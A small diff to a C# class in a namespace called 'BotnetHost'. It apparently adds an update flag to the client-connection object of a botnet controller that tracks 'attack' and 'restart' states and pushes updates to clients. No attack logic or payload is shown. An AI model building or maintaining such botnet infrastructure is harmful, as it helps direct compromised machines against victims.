@@ -23,6 +23,7 @@ namespace BotnetHost
         public string type = "TCP";
         public Boolean attack = false;
         public Boolean restart = false;
+        public Boolean hasUpdate = true;
 
         // Constructor
         public ClientConnection (Thread thread, Socket socket)
@@ -31,6 +32,7 @@ namespace BotnetHost
             this.clientSocket = socket;
             clientName = socket.RemoteEndPoint.ToString();
         }
+
         // Build update for client
         public string buildUpdate(string[] otherUpdates)
         {
@@ -81,6 +83,7 @@ namespace BotnetHost
 
             return output;
         }
+
         // Shutdown & Close Socket and Abort thread
         public void killClient()
         {
